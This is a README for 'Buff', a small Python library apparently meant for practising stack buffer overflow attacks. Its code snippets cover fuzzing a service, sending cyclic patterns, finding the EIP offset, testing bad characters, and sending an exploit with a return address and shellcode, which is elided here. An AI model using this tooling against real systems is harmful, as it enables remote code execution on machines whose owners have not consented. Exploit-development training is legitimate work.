<h1 align="center">What is Buff?</h1>  


<p align="center">
    <img src="https://raw.githubusercontent.com/the-robot/buff/master/images/guy.png" | width=200>
</p>

<p align="center">A simple BOF library I wrote under an hour to help me automate with BOF attack.</p>
<p align="center">It comes with fuzzer and a generic method to generate exploit easily.</p>

<br/>

> Not all the methods are documented yet as I do not have time now. Feel free to read the code, it's very small code-base anyway :)

# Usage

I made a [template as well](https://github.com/the-robot/buff/blob/master/examples/template.py).

## Setup Runner
```python
import buff

runner = buff.Buff(target = ("127.0.0.1", 1337), prefix = "", postfix = "")
```

## Fuzzer
```python
runner.fuzz()
```

## Sending Pattern
```python
runner.sendPattern()
```

## Find Pattern Offset
```python
BUFFER_SIZE = 2400
offset = buff.generator.findPatternOffset(BUFFER_SIZE, "386F4337")
print(offset)
```

## Sending Bad Characters
```python
runner.setBufferSize(2400)
runner.setEipOffset(1978)
runner.sendBadChars()

# you can also exclude by
runner.sendBadChars(exclude = ["\x42", "\x43"])

# change default EIP placeholder
runner.sendBadChars(fake_eip = "\x44\x44\x44\x44")
```

## Sending Exploit
```python
# Set buffer size
runner.setBufferSize(2400)

# Set EIP offset
runner.setEipOffset(1978)

# Set return address
eip_address = "\xaf\x11\x50\x62"
runner.setEipAddress(eip_address)

# Set padding
runner.setPaddingSize(16)

# Set exploit
exploit = ("\xdb\xde.....")
runner.setExploit(exploit)

runner.sendExploit()
```
